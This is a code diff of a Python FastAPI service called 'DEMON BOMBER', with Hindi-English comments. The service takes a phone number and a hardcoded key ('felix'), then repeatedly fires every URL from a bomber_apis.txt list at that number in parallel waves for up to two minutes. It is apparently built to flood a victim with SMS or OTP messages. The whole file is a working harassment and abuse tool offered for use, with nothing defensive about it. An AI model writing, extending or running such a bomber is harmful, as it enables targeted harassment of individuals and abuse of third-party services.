@@ -1,5 +1,5 @@
-# app.py - Full Power + Felix Key System
-from fastapi import FastAPI, HTTPException, Query
+# app.py - Sirf teri file ki APIs, kuch add nahi
+from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
 import aiohttp
@@ -7,9 +7,8 @@ import asyncio
 import time
 import os
 import re
-from typing import Optional
 
-app = FastAPI(title="🔥 DEMON BOMBER API - FELIX EDITION")
+app = FastAPI(title="🔥 DEMON BOMBER - FILE ONLY")
 
 app.add_middleware(
     CORSMiddleware,
@@ -18,8 +17,8 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ------------------ FELIX KEY SYSTEM ------------------
-VALID_KEYS = ["felix", "FELIX", "Felix", "f3l1x", "F3L1X"]
+# ------------------ FELIX KEY ------------------
+VALID_KEYS = ["felix", "FELIX", "Felix"]
 
 def validate_key(key: str) -> bool:
     return key in VALID_KEYS
@@ -31,6 +30,7 @@ def load_apis():
         with open("bomber_apis.txt", "r", encoding="utf-8") as f:
             for line in f:
                 url = line.strip()
+                # Sirf HTTP/HTTPS wali lines lo
                 if url and url.startswith("http"):
                     apis.append(url)
     except FileNotFoundError:
@@ -40,18 +40,17 @@ def load_apis():
     print(f"[+] Loaded {len(apis)} APIs from your file")
     return apis
 
+# TERI FILE SE LOAD - KUCH ADD NAHI, KUCH HATANA NAHI
 ALL_APIS = load_apis()
-print(f"[+] Total APIs: {len(ALL_APIS)}")
 
 class BombRequest(BaseModel):
     number: str
     duration: int = 30
     key: str
 
-# ------------------ FULL POWER BOMBER ENGINE ------------------
+# ------------------ BOMBER ENGINE ------------------
 async def hit_api(session, url, target):
-    """Single API hit - fast and furious"""
-    # Sab placeholders replace karo
+    # Teri file mein jo bhi placeholders hain, sab replace karo
     formatted = url
     formatted = formatted.replace("{num}", target)
     formatted = formatted.replace("{phone}", target)
@@ -77,22 +76,18 @@ async def hit_api(session, url, target):
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "application/json, text/plain, */*",
         "Accept-Language": "en-US,en;q=0.9",
-        "Connection": "keep-alive",
-        "Cache-Control": "no-cache"
+        "Connection": "keep-alive"
     }
     
     try:
         async with session.get(formatted, headers=headers, timeout=2) as r:
             if r.status in [200, 201, 202, 204, 302, 303, 307, 308]:
                 return True
-    except asyncio.TimeoutError:
-        pass
     except:
         pass
     return False
 
 async def run_bomber(target, duration):
-    """FULL POWER - All APIs fire together continuously"""
     if not ALL_APIS:
         return {"error": "No APIs loaded! Check bomber_apis.txt"}
     
@@ -102,29 +97,16 @@ async def run_bomber(target, duration):
     success = 0
     wave_count = 0
     
-    print(f"[+] Starting FULL POWER attack on {target} for {duration}s")
-    print(f"[+] Total APIs in file: {len(ALL_APIS)}")
-    
     async with aiohttp.ClientSession() as session:
         while time.time() < end:
-            wave_start = time.time()
-            
-            # 🔥 ALL APIs fire together in ONE wave - SAB EK SAATH
+            # TERI FILE KE SAARE APIs EK SAATH
             tasks = [hit_api(session, api, target) for api in ALL_APIS]
             results = await asyncio.gather(*tasks)
             
-            wave_total = len(results)
-            wave_success = sum(1 for r in results if r)
-            
-            total += wave_total
-            success += wave_success
+            total += len(results)
+            success += sum(1 for r in results if r)
             wave_count += 1
             
-            wave_time = time.time() - wave_start
-            
-            print(f"[Wave {wave_count}] {wave_success}/{wave_total} hits in {wave_time:.2f}s")
-            
-            # Minimal delay - full power mode
             await asyncio.sleep(0.1)
     
     return {
@@ -142,18 +124,16 @@ async def run_bomber(target, duration):
 @app.get("/")
 async def root():
     return {
-        "status": "🔥 DEMON BOMBER - FELIX EDITION",
-        "version": "2.0",
+        "status": "🔥 DEMON BOMBER - FILE ONLY",
+        "version": "3.0",
         "apis_loaded": len(ALL_APIS),
         "source": "bomber_apis.txt",
-        "auth": "Required key: felix",
-        "endpoints": {
-            "/bomb": "POST - Full power attack (key required)",
-            "/bomb/fast": "POST - Fire & forget (key required)",
-            "/apis": "GET - List all APIs (no key)",
-            "/health": "GET - Health check (no key)"
-        }
+        "auth": "Required key: felix"
     }
+
+@app.get("/health")
+async def health():
+    return {"status": "online", "apis": len(ALL_APIS)}
 
 @app.get("/apis")
 async def list_apis():
@@ -163,14 +143,8 @@ async def list_apis():
         "apis": ALL_APIS
     }
 
-@app.get("/health")
-async def health():
-    return {"status": "online", "apis": len(ALL_APIS)}
-
 @app.post("/bomb")
 async def bomb(req: BombRequest):
-    """FULL POWER ATTACK - All APIs together"""
-    
     # 🔐 FELIX KEY CHECK
     if not validate_key(req.key):
         raise HTTPException(401, "❌ Invalid key! Need 'felix'")
@@ -180,8 +154,8 @@ async def bomb(req: BombRequest):
     
     if req.duration < 5:
         req.duration = 5
-    if req.duration > 300:
-        req.duration = 300
+    if req.duration > 120:
+        req.duration = 120
     
     if not ALL_APIS:
         raise HTTPException(500, "No APIs loaded! Upload bomber_apis.txt")
@@ -196,38 +170,34 @@ async def bomb(req: BombRequest):
     }
 
 @app.post("/bomb/fast")
-async def bomb_fast(
-    number: str = Query(..., description="Target number"),
-    duration: int = Query(30, description="Duration in seconds"),
-    key: str = Query(..., description="Auth key: felix")
-):
-    """FULL POWER - Fire and forget (GET/POST query params)"""
+async def bomb_fast(req: BombRequest):
+    """Fire and forget - immediate response"""
     
     # 🔐 FELIX KEY CHECK
-    if not validate_key(key):
+    if not validate_key(req.key):
         raise HTTPException(401, "❌ Invalid key! Need 'felix'")
     
-    if len(number) < 8:
+    if len(req.number) < 8:
         raise HTTPException(400, "Invalid number")
     
-    if duration < 5:
-        duration = 5
-    if duration > 300:
-        duration = 300
+    if req.duration < 5:
+        req.duration = 5
+    if req.duration > 120:
+        req.duration = 120
     
     if not ALL_APIS:
         raise HTTPException(500, "No APIs loaded!")
     
     # Fire in background
-    asyncio.create_task(run_bomber(number, duration))
+    asyncio.create_task(run_bomber(req.number, req.duration))
     
     return {
         "success": True,
-        "message": "🔥 FULL POWER ATTACK STARTED!",
-        "target": number,
-        "duration": duration,
+        "message": "🔥 ATTACK STARTED!",
+        "target": req.number,
+        "duration": req.duration,
         "apis": len(ALL_APIS),
-        "key_used": key
+        "key_used": req.key
     }
 
 # ------------------ RUN ------------------
